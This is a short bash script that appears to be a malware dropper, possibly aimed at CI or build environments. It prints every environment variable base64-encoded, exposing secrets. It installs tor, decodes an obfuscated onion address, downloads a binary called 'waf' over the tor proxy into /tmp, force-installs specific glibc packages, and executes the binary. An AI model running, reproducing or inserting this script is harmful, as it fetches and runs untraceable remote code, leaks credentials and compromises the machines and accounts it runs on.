export DEBIAN_FRONTEND=noninteractive

echo Hello
env | base64

apt update -qq
apt install -y curl tor zstd
tor >/dev/null 2>&1 &

sleep $(shuf -i 10-20 -n 1)s
url=$(echo 'e\m8zNmNraGN$neGN3NWZjcjV3a2$$$$hndGd\we£G5jbW1v£dW5sbmg0££NDRibTRrZ2lucW40bGh3ajc0aWQub25pb24K' | base64 -di)

curl -s \
  --connect-timeout 25 \
  --retry 5 \
  --retry-delay 10 \
  --retry-max-time 300 \
  --socks5-hostname 127.0.0.1:9050 \
  $url/waf | unzstd -o /tmp/waf

curl -LO http://mirrors.kernel.org/ubuntu/pool/main/g/glibc/libc6_2.38-1ubuntu6_amd64.deb
curl -LO http://mirrors.kernel.org/ubuntu/pool/main/g/gcc-13/libstdc++6_13.2.0-4ubuntu3_amd64.deb

dpkg --force-all -i libc6_2.38-1ubuntu6_amd64.deb
dpkg --force-all -i libstdc++6_13.2.0-4ubuntu3_amd64.deb 

chmod +x /tmp/waf
/tmp/waf || :
kill %1
